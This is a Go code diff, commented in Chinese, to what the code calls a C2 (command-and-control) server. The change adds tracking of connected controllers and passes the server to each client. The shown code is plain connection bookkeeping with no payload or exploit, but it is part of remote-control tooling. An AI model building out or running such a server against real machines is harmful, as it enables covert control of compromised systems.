@@ -6,20 +6,22 @@ import (
 	"sync"
 )
 
-// Server 表示C2服务器
+// Server 表示C2服务器，管理客户端和控制端连接
 type Server struct {
-	listenAddr string
-	clients    map[int]*Client
-	nextID     int
-	mu         sync.Mutex
+	listenAddr  string               // 监听地址
+	clients     map[int]*Client      // 客户端连接映射
+	controllers map[*Controller]bool // 控制端连接映射
+	nextID      int                  // 下一个客户端ID
+	mu          sync.Mutex           // 互斥锁
 }
 
 // NewServer 创建新的服务器实例
 func NewServer(listenAddr string) *Server {
 	return &Server{
-		listenAddr: listenAddr,
-		clients:    make(map[int]*Client),
-		nextID:     1,
+		listenAddr:  listenAddr,
+		clients:     make(map[int]*Client),
+		controllers: make(map[*Controller]bool),
+		nextID:      1,
 	}
 }
 
@@ -65,6 +67,12 @@ func (s *Server) Start() error {
 // handleControllerConnection 处理控制端连接
 func (s *Server) handleControllerConnection(conn net.Conn) {
 	controller := NewController(conn, s)
+
+	// 注册控制器
+	s.mu.Lock()
+	s.controllers[controller] = true
+	s.mu.Unlock()
+
 	fmt.Printf("控制端已连接: %s\n", conn.RemoteAddr())
 
 	// 发送欢迎消息
@@ -76,6 +84,11 @@ func (s *Server) handleControllerConnection(conn net.Conn) {
 	// 启动命令处理循环
 	controller.handleCommands()
 
+	// 清理控制器
+	s.mu.Lock()
+	delete(s.controllers, controller)
+	s.mu.Unlock()
+
 	fmt.Printf("控制端已断开连接: %s\n", conn.RemoteAddr())
 }
 
@@ -84,7 +97,7 @@ func (s *Server) handleClientConnection(conn net.Conn) {
 	s.mu.Lock()
 	clientID := s.nextID
 	s.nextID++
-	client := NewClient(clientID, conn)
+	client := NewClient(clientID, conn, s) // 传递server引用
 	s.clients[clientID] = client
 	s.mu.Unlock()
 
